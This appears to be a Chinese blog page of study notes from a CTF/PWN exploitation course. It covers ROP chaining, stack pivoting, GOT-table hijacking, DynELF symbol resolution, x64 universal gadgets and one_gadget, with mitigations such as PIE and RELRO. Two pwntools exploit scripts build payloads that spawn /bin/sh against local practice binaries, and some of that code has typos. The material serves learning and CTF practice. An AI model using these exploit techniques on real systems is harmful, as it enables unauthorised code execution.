<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114458.png" alt></p>
<p>执行free之后：</p>
<p>再次执行<code>A = malloc(0x100 - 8)</code>：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114752.png" alt></p>
<p>再次<code>free(A)</code>：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114907.png" alt></p>
<p>再次<code>A = malloc(0x80 - 8)</code>：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115030.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115156.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115251.png" alt></p>
<p>执行<code>free(B)</code>后：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115440.png" alt></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/04/26/│ñ═ñPWN▒╩╝╟02/" class="post-title-link" itemprop="url">长亭PWN笔记02</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-04-26 01:55:21 / Geändert am: 19:56:40" itemprop="dateCreated datePublished" datetime="2020-04-26T01:55:21-07:00">2020-04-26</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/长亭PWN笔记/" itemprop="url" rel="index"><span itemprop="name">长亭PWN笔记</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li>ROP实战技巧之一：连接多个libc函数调用</li>
<li>ROPP实战技巧之二：栈迁移(Stack Pivot)</li>
<li>ROP案例详解</li>
<li>x64下的ROP</li>
<li>ROP和GOT表劫持相关缓解技术</li>
</ul>
<h2 id="回顾：栈布局"><a href="#回顾：栈布局" class="headerlink" title="回顾：栈布局"></a>回顾：栈布局</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png" alt></p>
<h2 id="回顾：Return-to-Libc"><a href="#回顾：Return-to-Libc" class="headerlink" title="回顾：Return to Libc"></a>回顾：Return to Libc</h2><p>一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163511.png" alt></p>
<p>那如何串联3次或更多的libc函数调用？如果libc函数有2个以上的参数，如何不是ROP Payload？例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,size)</span><br><span class="line">write(fd,buf,size)</span><br></pre></td></tr></table></figure>

<p>DEMO代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">"./ret2libc"</span>)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">"This is your gift: "</span>)</span><br><span class="line">setvbuf_addr = int(io.recvline().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc.sym就是offset</span></span><br><span class="line">libc_base = setvbuf_addr - libc.sym[<span class="string">"setvbuf"</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">log.info(<span class="string">"setvbuf_addr:0x%x"</span>) % setvbuf_addr)</span><br><span class="line">log.info(<span class="string">"libc_base:0x%x"</span>) % libc_base)</span><br><span class="line">log.info(<span class="string">"system_addr:0x%x"</span>) % system_addr)</span><br><span class="line">log.info(<span class="string">"binsh_addr:0x%x"</span>) % binsh_addr)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x68</span> + <span class="string">"B"</span>*<span class="number">4</span></span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += <span class="string">'CCCC'</span></span><br><span class="line">pay += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="连接多个libc函数调用"><a href="#连接多个libc函数调用" class="headerlink" title="连接多个libc函数调用"></a>连接多个libc函数调用</h2><p>例如要连接<code>read(fd1,buf1,size1)</code>和<code>write(fd2,buf2,size2)</code>两个函数调用，无法按照<code>system(&quot;/bin/sh&quot;)</code>和<code>exit(0)</code>那样布置ROP Payload，参数会产生重叠</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164655.png" alt></p>
<p>使用<code>pop ret</code>这类的ROP Gadget可以解决这个问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx ; pop esi ; pop edi ; ret ;</span><br></pre></td></tr></table></figure>

<p>这种三个的gadget下文记为<strong>pop3 ret</strong></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164912.png" alt></p>
<h4 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426165102.png" alt></p>
<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><ul>
<li>定义<ul>
<li>通过一个修改esp寄存器的gadget来改变栈的位置</li>
</ul>
</li>
<li>应用场景<ul>
<li>溢出长度较短，不够做ROP（例1）</li>
<li>溢出载荷以0结尾，而gadget地址为0开头（例2）</li>
<li>在泄露地址后，我们需要执行一个新的ROP链</li>
</ul>
</li>
</ul>
<p>例1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> dst[<span class="number">512</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(user)&gt;<span class="number">536</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//536-512 = 24 字节的溢出，太短！</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dst[<span class="number">512</span>]</span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br><span class="line">x64 assembly</span><br><span class="line"><span class="number">0x406113</span>:	<span class="number">55</span>			push	%rbp</span><br><span class="line"><span class="number">0x406114</span>:	<span class="number">41</span> <span class="number">89</span> d4	mov		%edx,%e12d</span><br></pre></td></tr></table></figure>

<h3 id="add-esp"><a href="#add-esp" class="headerlink" title="add esp"></a>add esp</h3><p>将esp加上一个固定值的gadget我们称为“add esp”，例如：add esp，0x6c;ret;</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426112159.png" alt></p>
<h3 id="pop-ebp-ret-leave-ret"><a href="#pop-ebp-ret-leave-ret" class="headerlink" title="pop ebp ret + leave ret"></a>pop ebp ret + leave ret</h3><ul>
<li><code>pop ebp;ret;</code> + <code>leavel;ret;</code>两个gadget组合可以将esp改成任意值</li>
<li><code>pop ebp;ret;</code>可以将ebp改为任意值</li>
<li><code>leave = mov esp,ebp;pop ebp</code>因此ebp会存入esp，esp可以任意控制</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
<li>第一次ROP，泄露libc地址<ul>
<li>调用<code>write(1,write_got,4)</code>，泄露write函数地址，同方法1</li>
<li>调用read(0,new_stack,ROP_len)，读取第二次ROP Payload到BSS段（新的栈）</li>
<li>利用栈迁移<code>pop ebp ret</code>+<code>leave ret</code>，连接执行第二次ROP</li>
<li>等待栈迁移触发第二次ROP执行，启动shell    </li>
</ul>
</li>
</ul>
<h2 id="GOT表劫持"><a href="#GOT表劫持" class="headerlink" title="GOT表劫持"></a>GOT表劫持</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426135345.png" alt></p>
<ul>
<li>上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？</li>
<li>在ROP中通过Return To PLT调用read和write，实际上可以实现内存任意读写</li>
<li>因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改wrtie函数的GOT表项，然后再次调用write，实际上此时调用的则是GOT表项被劫持后的值，例如system()</li>
</ul>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426141137.png" alt></p>
<h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><ul>
<li>使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入<ul>
<li>调用write(1,write_got,4)，泄露write函数地址</li>
<li>调用read()，修改write()函数的GOT表项为system地址</li>
<li>调用read(0,bss,len(cmd))，将命令字符串(“/bin/sh”)写入.bss Section</li>
<li>调用write(cmd)，实际上调用的system(cmd)</li>
</ul>
</li>
<li>读取泄露的write函数地址，计算system()地址</li>
<li>输入system()地址，修改write()函数的GOT表项</li>
<li>输入命令字符串”/bin/sh”，写入.bss Section</li>
<li>调用write(cmd)来运行system(cmd)</li>
</ul>
<h2 id="如果题目没有给予libc怎么办"><a href="#如果题目没有给予libc怎么办" class="headerlink" title="如果题目没有给予libc怎么办"></a>如果题目没有给予libc怎么办</h2><ul>
<li><p>从寻找我们需要的<a href="gttps://libc.blukat.me/" target="_blank" rel="noopener">libc_base</a></p>
</li>
<li><p>使用DynELF</p>
</li>
</ul>
<h4 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h4><ul>
<li>原理：如果可以实现任意内存读，可以模拟<code>_dll_runtime_resolve</code>函数的行为来解析符号，这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能</li>
<li>编写一个通用的任意内存泄露函数<ul>
<li>通过返回main()函数来允许内存泄露触发多次</li>
</ul>
</li>
<li>将泄露函数传入DynELF来解析system()函数的地址</li>
<li>通过ROP来调用system(“/bin/sh”)</li>
<li>当目标的libc库未知时，DynELF非常有用</li>
</ul>
<p>DEMO展示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,endian=<span class="string">'little'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">main = <span class="number">0x80481D</span></span><br><span class="line">bss = <span class="number">0x8049700</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line">p = process(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] PID: %s"</span> % proc.pidof(p)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将栈溢出封装成ROP调用，方便多次触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rop</span><span class="params">(rop)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line"><span class="comment">#任意内存读函数，通过ROP调用write函数将任意地址内存读出，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'write'</span>]) + p32(main) + p32(<span class="number">1</span>) + p32(add) + p32(<span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#任意内存写函数，通过ROP调用write函数将任意地址内存写入，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poke</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'read'</span>]) + p32(main) + p32(<span class="number">0</span>) + p32(add) + p32(len(data))</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.send(data)</span><br><span class="line"><span class="comment">#将任意内存泄露函数peek传入DynELF</span></span><br><span class="line">d = DynELF(peek,elf=elf)</span><br><span class="line"><span class="comment">#DynELF模块可以实现任意库中的任意符号解析，例如system</span></span><br><span class="line">system = d.lookup(<span class="string">"system"</span>,<span class="string">"libc.so"</span>)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将要执行的命令写入.bss Section</span></span><br><span class="line">poke(bss,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"><span class="comment">#通过ROP运行system(cmd)</span></span><br><span class="line">do_rop(p32(system) + p32(<span class="number">0xDEADBEEF</span>) + p32(bss))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="x64架构下的ROP"><a href="#x64架构下的ROP" class="headerlink" title="x64架构下的ROP"></a>x64架构下的ROP</h2><ul>
<li>amd64（64位）cdecl调用约定<ul>
<li>使用寄存器rdi、rsi、rdx、rcx、r8、r9来传递前6个参数</li>
<li>第七个及以上的参数通过栈来传递</li>
</ul>
</li>
<li>参数在寄存器中，必须用gadget来设置参数<ul>
<li>pop rdi ; ret </li>
<li>pop rsi ; pop r15 ; ret ;</li>
<li>用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget</li>
</ul>
</li>
</ul>
<h4 id="x64下通用Gadget"><a href="#x64下通用Gadget" class="headerlink" title="x64下通用Gadget"></a>x64下通用Gadget</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="keyword">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>几乎所有的x64 ELF在_libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13、r14、r15，再通过一个Gadget将这三个值分别送入rdx、rsi、edi中，正好涵盖了x64 cdecl调用约定下的前三个参数</p>
<h2 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h2><p>通过OneGadget工具进行查找：<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p>
<p>通常执行system(“/bin/sh”)需要在调用system之前传递参数；</p>
<p>比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；</p>
<p>通常通过寻找字符串”/bin/sh”的引用来寻找（对着/bin/sh的地址在IDA Pro中按X）</p>
<h2 id="如何防御ROP"><a href="#如何防御ROP" class="headerlink" title="如何防御ROP"></a>如何防御ROP</h2><ul>
<li>位置无关代码（PIE）可防御攻击者直接ROP<ul>
<li>攻击者不知道代码地址</li>
<li>ROP与return to PLT技术无法直接使用</li>
</ul>
</li>
<li>PIE绕过方法<ul>
<li>结合信息泄露漏洞</li>
<li>x86_32架构下可爆破<ul>
<li>内存地址随机化粒度以页为单位：0x1000字节对齐</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="如何防御GOT表劫持"><a href="#如何防御GOT表劫持" class="headerlink" title="如何防御GOT表劫持"></a>如何防御GOT表劫持</h2><ul>
<li>重定位只读(Relocation Read Only)缓解措施<ul>
<li>编译选项：gcc -z , relro</li>
<li>在进入main()之前，所有的外部函数都会被解析</li>
<li>所有GOT表设置为只读</li>
<li>绕过方法<ul>
<li>劫持为开启该保护的动态库中的GOT表(例如libc中的GOT表)</li>
<li>改写函数返回地址或函数指针</li>
</ul>
</li>
</ul>
</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/04/26/│ñ═ñPWN▒╩╝╟01/" class="post-title-link" itemprop="url">长亭PWN笔记01</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-04-26 01:54:26 / Geändert am: 19:56:48" itemprop="dateCreated datePublished" datetime="2020-04-26T01:54:26-07:00">2020-04-26</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/长亭PWN笔记/" itemprop="url" rel="index"><span itemprop="name">长亭PWN笔记</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="PWN工具集合"><a href="#PWN工具集合" class="headerlink" title="PWN工具集合"></a>PWN工具集合</h2><ul>
<li>zio - 框架<ul>
<li>接口简单易用</li>
<li><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></li>
</ul>
</li>
<li>Pwntools<ul>
<li>Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等</li>
<li><a href="http://pwntools.com/" target="_blank" rel="noopener">http://pwntools.com/</a></li>
<li><a href="https://github.com/gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/gallopsled/pwntools</a></li>
</ul>
</li>
<li>peda/pwndbg - gdb调试插件</li>
<li>libheap</li>
</ul>
<h2 id="利用栈溢出"><a href="#利用栈溢出" class="headerlink" title="利用栈溢出"></a>利用栈溢出</h2><h3 id="Example-BOE-program："><a href="#Example-BOE-program：" class="headerlink" title="Example BOE program："></a>Example BOE program：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"argv[1]:%s\n"</span>,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 